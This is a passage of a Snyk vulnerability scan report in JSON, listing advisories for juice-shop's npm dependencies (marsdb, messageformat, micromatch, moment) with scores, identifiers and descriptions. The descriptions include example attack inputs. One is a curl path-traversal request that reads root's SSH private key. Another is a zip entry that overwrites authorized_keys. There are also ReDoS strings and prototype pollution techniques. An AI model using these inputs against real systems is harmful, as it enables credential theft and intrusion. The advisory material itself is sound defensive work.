        "name": "lodash.set",
        "version": "4.3.2"
      },
      {
        "id": "SNYK-JS-MARSDB-480405",
        "title": "Arbitrary Code Injection",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "credit": [
          "Francois Gauthier"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "marsdb",
        "references": [
          {
            "url": "https://www.npmjs.com/advisories/1122",
            "title": "NPM Security Advisory"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:59:19.608436Z"
          }
        ],
        "description": "## Overview\n[marsdb](https://github.com/c58/marsdb) is a MarsDB is a lightweight client-side database.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection. In the `DocumentMatcher` class, selectors on `$where` clauses are passed to a Function constructor unsanitized. This allows attackers to run arbitrary commands in the system when the function is executed.\n## Remediation\nThere is no fixed version for `marsdb`.\n## References\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1122)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-94"
          ],
          "NSP": [
            "1122"
          ],
          "GHSA": [
            "GHSA-5mrr-rgp6-x4gr"
          ]
        },
        "packageName": "marsdb",
        "proprietary": false,
        "creationTime": "2019-11-06T09:43:57.923159Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2019-08-29T17:53:27Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-11-06T11:41:52Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T13:59:19.608436Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "juice-shop@19.0.0",
          "marsdb@0.6.11"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "marsdb",
        "version": "0.6.11"
      },
      {
        "id": "SNYK-JS-MESSAGEFORMAT-13109646",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
        "credit": [
          "Cya_i_e"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0-beta.0"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "3.0.0-beta.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "messageformat",
        "references": [
          {
            "url": "https://github.com/messageformat/messageformat/issues/452",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-09-28T13:56:49.597914Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2025-09-28T13:56:49.597914Z"
          }
        ],
        "description": "## Overview\n[messageformat](https://www.npmjs.org/package/messageformat) is an Intl.MessageFormat / Unicode MessageFormat 2 parser, runtime and polyfill\n\nAffected versions of this package are vulnerable to Prototype Pollution via improper handling of message key paths containing special characters in the `process` when processing nested message keys. An attacker can modify the JavaScript Object prototype by injecting properties into the global object prototype through specially crafted message input, potentially causing denial of service or other unintended behaviors.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `messageformat` to version 3.0.0-beta.0 or higher.\n## References\n- [GitHub Issue](https://github.com/messageformat/messageformat/issues/452)\n",
        "epssDetails": {
          "percentile": "0.23289",
          "probability": "0.00074",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-57349"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "GHSA": [
            "GHSA-xfqm-j7pc-xrfc"
          ]
        },
        "packageName": "messageformat",
        "proprietary": false,
        "creationTime": "2025-09-28T10:37:10.047653Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-09-24T21:30:37Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-09-28T13:56:49.589591Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-09-28T13:56:49.597914Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "i18n@0.11.1",
          "messageformat@2.3.0"
        ],
        "upgradePath": [
          false,
          "i18n@0.14.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "messageformat",
        "version": "2.3.0"
      },
      {
        "id": "SNYK-JS-MICROMATCH-6838728",
        "title": "Inefficient Regular Expression Complexity",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        "credit": [
          "Mário Teixeira"
        ],
        "semver": {
          "vulnerable": [
            "<4.0.8"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "4.0.8"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "micromatch",
        "references": [
          {
            "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/micromatch/micromatch/issues/243",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/micromatch/micromatch/pull/266",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js%23L448",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2025-08-05T01:13:15.540701Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-05-15T14:14:04.977113Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-10-30T11:04:10.566142Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-08-07T05:48:37.125299Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-08-05T01:13:15.540701Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-05-15T14:14:04.977113Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:10.566142Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Inefficient Regular Expression Complexity due to the use of unsafe pattern configurations that allow greedy matching through the `micromatch.braces()` function. An attacker can cause the application to hang or slow down by passing a malicious payload that triggers extensive backtracking in regular expression processing.\n## Remediation\nUpgrade `micromatch` to version 4.0.8 or higher.\n## References\n- [GitHub Commit](https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0)\n- [GitHub Issue](https://github.com/micromatch/micromatch/issues/243)\n- [GitHub PR](https://github.com/micromatch/micromatch/pull/266)\n- [Vulnerable Code](https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448)\n",
        "epssDetails": {
          "percentile": "0.29299",
          "probability": "0.00105",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-4067"
          ],
          "CWE": [
            "CWE-1333"
          ]
        },
        "packageName": "micromatch",
        "proprietary": false,
        "creationTime": "2024-05-13T14:42:04.968336Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-05-13T10:40:15Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-13T14:42:05.172219Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-08-07T05:48:37.125299Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "check-dependencies@1.1.1",
          "findup-sync@2.0.0",
          "micromatch@3.1.10"
        ],
        "upgradePath": [
          false,
          "check-dependencies@2.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "micromatch",
        "version": "3.1.10"
      },
      {
        "id": "SNYK-JS-MOMENT-2440688",
        "title": "Directory Traversal",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<2.29.2"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.29.2"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": "This vulnerability is only applicable when the user-provided locale name is not sanitized before it has been used."
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "moment",
        "references": [
          {
            "url": "https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5",
            "title": "GitHub Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:49:13.115980Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:59.336348Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:56:27.815354Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:13.115980Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:59.336348Z"
          }
        ],
        "description": "## Overview\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable to Directory Traversal when a user provides a locale string which is directly used to switch moment locale.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `moment` to version 2.29.2 or higher.\n## References\n- [GitHub Commit](https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5)\n",
        "epssDetails": {
          "percentile": "0.71131",
          "probability": "0.00694",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-24785"
          ],
          "CWE": [
            "CWE-22"
          ],
          "GHSA": [
            "GHSA-8hfj-j24r-96c4"
          ]
        },
        "packageName": "moment",
        "proprietary": false,
        "creationTime": "2022-04-05T08:46:07.677588Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-04-05T08:39:23Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-04-05T12:30:50.878091Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:59.336348Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "moment@2.0.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "moment",
        "version": "2.0.0"
      },
      {
        "id": "npm:moment:20160126",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        "credit": [
          "Adam Baldwin"
        ],
        "semver": {
          "vulnerable": [
            "<2.11.2"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.11.2"
        ],
        "patches": [
          {
            "id": "patch:npm:moment:20160126:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20160126/moment_20160126_0_0_34af63b8b21208a949dfaf42d228502c73d20ec0.patch"
            ],
            "version": "<=2.11.1 >2.10.6",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.800167Z"
          },
          {
            "id": "patch:npm:moment:20160126:1",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20160126/moment_20160126_0_1_34af63b8b21208a949dfaf42d228502c73d20ec0.patch"
            ],
            "version": "<=2.10.6 >2.9.0",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.801226Z"
          },
          {
            "id": "patch:npm:moment:20160126:2",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20160126/moment_20160126_0_2_34af63b8b21208a949dfaf42d228502c73d20ec0.patch"
            ],
            "version": "<=2.9.0 >2.2.1",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.802270Z"
          },
          {
            "id": "patch:npm:moment:20160126:3",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20160126/moment_20160126_0_3_34af63b8b21208a949dfaf42d228502c73d20ec0.patch"
            ],
            "version": "=2.2.1",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.803327Z"
          },
          {
            "id": "patch:npm:moment:20160126:4",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20160126/moment_20160126_0_4_34af63b8b21208a949dfaf42d228502c73d20ec0.patch"
            ],
            "version": "<2.2.1 >2.0.0",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.804441Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "moment",
        "references": [
          {
            "url": "https://github.com/moment/moment/commit/52a807b961ead925be11ff5e632c8f7325a9ce36",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/moment/moment/issues/2936",
            "title": "GitHub Issue"
          },
          {
            "url": "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS",
            "title": "OWASP ReDoS"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-03-11T09:46:53.704714Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:30.942036Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:46:53.704714Z"
          }
        ],
        "description": "## Overview\r\n[`moment`](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\r\n\r\nAn attacker can provide a long value to the `duration` function, which nearly matches the pattern being matched. This will cause the regular expression matching to take a long time, all the while occupying the event loop and preventing it from processing other requests and making the server unavailable (a Denial of Service attack).\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `moment` to version `2.11.2` or greater.\r\n\r\n## References\r\n- [OWASP ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\r\n- [GitHub Commit](https://github.com/moment/moment/commit/52a807b961ead925be11ff5e632c8f7325a9ce36)\r\n- [GitHub Issue](https://github.com/moment/moment/issues/2936)",
        "epssDetails": {
          "percentile": "0.79518",
          "probability": "0.01352",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2016-4055"
          ],
          "CWE": [
            "CWE-400"
          ],
          "NSP": [
            "55"
          ],
          "GHSA": [
            "GHSA-87vv-r9j6-g5qv"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-MOMENT-10084",
            "npm:moment:20160126"
          ]
        },
        "packageName": "moment",
        "proprietary": false,
        "creationTime": "2016-02-01T19:00:03.862000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-MOMENT-10084"
        ],
        "disclosureTime": "2016-01-26T20:04:21Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2016-02-01T19:00:03Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:46:53.704714Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "moment@2.0.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "moment",
        "version": "2.0.0"
      },
      {
        "id": "npm:moment:20161019",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "Snyk Security Research Team"
        ],
        "semver": {
          "vulnerable": [
            "<2.15.2"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.15.2"
        ],
        "patches": [
          {
            "id": "patch:npm:moment:20161019:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20161019/moment_20161019_0_1.patch"
            ],
            "version": "<2.15.2 >=2.14.0",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.848228Z"
          },
          {
            "id": "patch:npm:moment:20161019:1",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20161019/moment_20161019_0_0.patch"
            ],
            "version": "<2.14.0 >=2.12.0",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.849308Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "moment",
        "references": [
          {
            "url": "https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc",
            "title": "Proof of concept"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
